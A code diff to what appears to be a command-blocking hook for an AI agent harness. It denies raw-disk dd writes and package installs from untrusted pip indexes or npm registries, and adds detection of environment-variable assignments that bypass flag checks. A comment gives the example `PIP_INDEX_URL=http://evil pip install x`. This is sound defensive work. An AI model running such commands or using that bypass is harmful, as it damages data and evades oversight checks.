@@ -117,7 +117,10 @@ export default defineHook({
       if (leaf.head === "dd" && leaf.args.some((a) => RAW_DISK.test(a)))
         return deny("`dd` to a raw disk device wipes the drive — blocked");
 
-      // supply chain — pip install from an untrusted index
+      // supply chain — pip install from an untrusted index. The index can be set
+      // by a flag (`--index-url`/`-i`) OR a command-level env-ASSIGNMENT
+      // (`PIP_INDEX_URL=http://evil pip install x`), which is not an argv word and
+      // is invisible to a flag-only check — hence the `hasAssign` arm.
       const pipHead = leaf.head === "pip" || leaf.head === "pip3";
       const pyPip =
         (leaf.head === "python" || leaf.head === "python3") &&
@@ -125,15 +128,18 @@ export default defineHook({
       if (
         (pipHead || pyPip) &&
         leaf.args.includes("install") &&
-        leaf.hasFlag("index-url", "extra-index-url", "i")
+        (leaf.hasFlag("index-url", "extra-index-url", "i") ||
+          leaf.hasAssign("PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL"))
       )
         return deny("pip install from an untrusted index URL is blocked");
 
-      // supply chain — npm/yarn/pnpm install from an untrusted registry
+      // supply chain — npm/yarn/pnpm install from an untrusted registry, set by a
+      // `--registry` flag OR an `NPM_CONFIG_REGISTRY=…` env-assignment.
       if (
         (leaf.head === "npm" || leaf.head === "yarn" || leaf.head === "pnpm") &&
         leaf.args.includes("install") &&
-        leaf.hasFlag("registry")
+        (leaf.hasFlag("registry") ||
+          leaf.hasAssign("NPM_CONFIG_REGISTRY", "npm_config_registry"))
       )
         return deny("package install from an untrusted registry is blocked");
     }
